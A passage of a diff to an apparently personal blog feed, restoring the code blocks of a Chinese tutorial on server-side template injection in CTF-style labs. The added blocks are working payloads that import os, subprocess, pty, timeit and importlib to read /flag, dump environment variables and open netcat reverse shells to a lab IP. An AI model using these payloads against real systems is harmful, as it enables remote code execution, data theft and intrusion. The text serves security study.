-&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#x3C;!--swig￼83--&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;
+{% import os %}
+{{ os.popen(&#39;cat /flag&#39;).read() }}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/04/11/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/53.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;那这里就很像沙箱逃逸了啊，用&lt;code&gt;&amp;#123;%%&amp;#125;&lt;/code&gt;导入模块，&lt;code&gt;&amp;#123;&amp;#123;&amp;#125;&amp;#125;&lt;/code&gt;执行&lt;/p&gt;
 &lt;h3 id=&#34;ctypes&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ctypes&#34;&gt;#&lt;/a&gt; ctypes&lt;/h3&gt;
-&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#x3C;!--swig￼87--&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;
+{%import ctypes%}
+{{print(subprocess.getoutput(&#39;cat /flag&#39;))}}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;之前Mako也是本来打算测试这个ctypes但是由于没有回显，这里突然想到可以反弹shell&lt;/p&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/04/11/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/54.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;h3 id=&#34;subprocess&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#subprocess&#34;&gt;#&lt;/a&gt; subprocess&lt;/h3&gt;
-&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#x3C;!--swig￼89--&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;
+{%import subprocess %}
+{{print(subprocess.getoutput(&#39;nc -e /bin/bash 192.168.152.128 4444&#39;))}}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;反弹shell这招还真是全能&lt;/p&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/04/11/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/55.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;h3 id=&#34;pty&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pty&#34;&gt;#&lt;/a&gt; pty&lt;/h3&gt;
-&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#x3C;!--swig￼91--&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;
+{%import pty%}
+{{pty.spawn([&#39;nc&#39;,&#39;-e&#39;,&#39;/bin/bash&#39;,&#39;192.168.152.128&#39;,&#39;4444&#39;])}}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/04/11/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/56.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;h3 id=&#34;timeit&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#timeit&#34;&gt;#&lt;/a&gt; timeit&lt;/h3&gt;
-&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#x3C;!--swig￼93--&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;
+{%import timeit%}
+{{timeit.timeit(&#34;__import__(&#39;os&#39;).system(&#39;nc -e /bin/bash 192.168.152.128 4444&#39;)&#34;, number=1)}}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;除了反弹shell还可以有写入文件的思路&lt;/p&gt;
-&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#x3C;!--swig￼94--&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;
+{%import timeit%}
+{{timeit.timeit(&#34;__import__(&#39;os&#39;).system(&#39;cat /flag &gt; 1.txt&#39;)&#34;, number=1)}}
+{{open(&#39;1.txt&#39;).read()}}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/04/11/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/57.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/04/11/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/58.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;h3 id=&#34;importlib&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#importlib&#34;&gt;#&lt;/a&gt; importlib&lt;/h3&gt;
-&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#x3C;!--swig￼97--&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;
+{%import importlib%}
+{{importlib.import_module(&#39;os&#39;).system(&#39;nc -e /bin/bash 192.168.152.128 4444&#39;)}}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;有反弹shell的思路都可以参照timeit中写文件的思路试试&lt;/p&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/04/11/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/59.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/04/11/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/60.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;h3 id=&#34;codecs&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#codecs&#34;&gt;#&lt;/a&gt; codecs&lt;/h3&gt;
-&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#x3C;!--swig￼100--&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;
+{%import codecs%}
+{{codecs.open(&#39;/flag&#39;).read()}}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/04/11/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/62.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;h2 id=&#34;open读取文件-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#open读取文件-2&#34;&gt;#&lt;/a&gt; open读取文件&lt;/h2&gt;
-&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#x3C;!--swig￼102--&gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#x3C;!--swig￼103--&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#123;&amp;#123;open(&#39;/flag&#39;).read()&amp;#125;&amp;#125;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#123;&amp;#123;__import__(&#34;builtins&#34;).open(&#39;/flag&#39;).read()&amp;#125;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/04/11/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/61.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;h2 id=&#34;getline&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#getline&#34;&gt;#&lt;/a&gt; getline&lt;/h2&gt;
-&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#x3C;!--swig￼105--&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#123;&amp;#123;__import__(&#34;linecache&#34;).getline(&#39;/flag&#39;,1)&amp;#125;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/04/11/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/63.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;h2 id=&#34;getlines&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#getlines&#34;&gt;#&lt;/a&gt; getlines&lt;/h2&gt;
-&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#x3C;!--swig￼107--&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;
+{%import linecache%}
+{{linecache.getlines(&#39;/flag&#39;)}}
+
+{{__import__(&#34;linecache&#34;).getlines(&#39;/flag&#39;)}}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/04/11/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/64.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;h2 id=&#34;获取环境信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#获取环境信息&#34;&gt;#&lt;/a&gt; 获取环境信息&lt;/h2&gt;
 &lt;h3 id=&#34;env&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#env&#34;&gt;#&lt;/a&gt; env&lt;/h3&gt;
-&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#x3C;!--swig￼109--&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;
+{%import os%}
+{{os.popen(&#39;env&#39;).read()}}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/04/11/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/65.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;h3 id=&#34;environ&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#environ&#34;&gt;#&lt;/a&gt; environ&lt;/h3&gt;
-&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#x3C;!--swig￼111--&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;
+{%import os%}
+{{os.environ}}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/04/11/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/66.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 </content>
         <updated>2026-04-11T12:50:00.000Z</updated>
@@ -11995,7 +12031,7 @@ http://127.0.0.1:8080/example/HelloWorld!%&amp;#123;#req=#context.get(&#39;co&#3
 &lt;span class=&#34;line&#34;&gt;&lt;span style=&#34;color:#B56959;--shiki-dark:#C98A7D&#34;&gt;&amp;#x3C;/head&gt;&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&#34;line&#34;&gt;&lt;span style=&#34;color:#B56959;--shiki-dark:#C98A7D&#34;&gt;&amp;#x3C;body class=&#34;light&#34; id=&#34;page-body&#34;&gt;&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&#34;line&#34;&gt;&lt;span style=&#34;color:#B56959;--shiki-dark:#C98A7D&#34;&gt;    &amp;#x3C;div class=&#34;container box light&#34; id=&#34;content-box&#34;&gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class=&#34;line&#34;&gt;&lt;span style=&#34;color:#B56959;--shiki-dark:#C98A7D&#34;&gt;        &amp;#x3C;h2&gt;👋 Welcome, &amp;#x3C;span id=&#34;role-text&#34;&gt;&amp;#x3C;!--swig￼8--&gt;&amp;#x3C;/span&gt;!&amp;#x3C;/h2&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span style=&#34;color:#B56959;--shiki-dark:#C98A7D&#34;&gt;        &amp;#x3C;h2&gt;👋 Welcome, &amp;#x3C;span id=&#34;role-text&#34;&gt;&amp;#123;&amp;#123; role &amp;#125;&amp;#125;&amp;#x3C;/span&gt;!&amp;#x3C;/h2&gt;&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&#34;line&#34;&gt;&lt;span style=&#34;color:#B56959;--shiki-dark:#C98A7D&#34;&gt;        &amp;#x3C;p&gt;You can customize your profile theme below.&amp;#x3C;/p&gt;&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&#34;line&#34;&gt;&lt;span style=&#34;color:#B56959;--shiki-dark:#C98A7D&#34;&gt;        &lt;/span&gt;&lt;/span&gt;
 &lt;span class=&#34;line&#34;&gt;&lt;span style=&#34;color:#B56959;--shiki-dark:#C98A7D&#34;&gt;        &amp;#x3C;hr&gt;&lt;/span&gt;&lt;/span&gt;
@@ -12302,7 +12338,10 @@ http://127.0.0.1:8080/example/HelloWorld!%&amp;#123;#req=#context.get(&#39;co&#3
 &lt;span class=&#34;line&#34;&gt;&lt;span style=&#34;color:#B56959;--shiki-dark:#C98A7D&#34;&gt;        &amp;#x3C;input type=&#34;submit&#34; value=&#34;执行代码 (Execute)&#34;&gt;&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&#34;line&#34;&gt;&lt;span style=&#34;color:#B56959;--shiki-dark:#C98A7D&#34;&gt;    &amp;#x3C;/form&gt;&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&#34;line&#34;&gt;&lt;span style=&#34;color:#B56959;--shiki-dark:#C98A7D&#34;&gt;    &lt;/span&gt;&lt;/span&gt;
-&lt;span class=&#34;line&#34;&gt;&lt;span style=&#34;color:#B56959;--shiki-dark:#C98A7D&#34;&gt;    &amp;#x3C;!--swig￼0--&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span style=&#34;color:#B56959;--shiki-dark:#C98A7D&#34;&gt;    &amp;#123;% if result != None %&amp;#125;
+        &lt;h3&gt;执行结果：&lt;/h3&gt;
+        &lt;pre&gt;&amp;#123;&amp;#123; result &amp;#125;&amp;#125;&lt;/pre&gt;
+    &amp;#123;% endif %&amp;#125;&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&#34;line&#34;&gt;&lt;span style=&#34;color:#B56959;--shiki-dark:#C98A7D&#34;&gt;&amp;#x3C;/body&gt;&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&#34;line&#34;&gt;&lt;span style=&#34;color:#B56959;--shiki-dark:#C98A7D&#34;&gt;&amp;#x3C;/html&gt;&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&#34;line&#34;&gt;&lt;span style=&#34;color:#B5695977;--shiki-dark:#C98A7D77&#34;&gt;&#34;&#34;&#34;&lt;/span&gt;&lt;/span&gt;
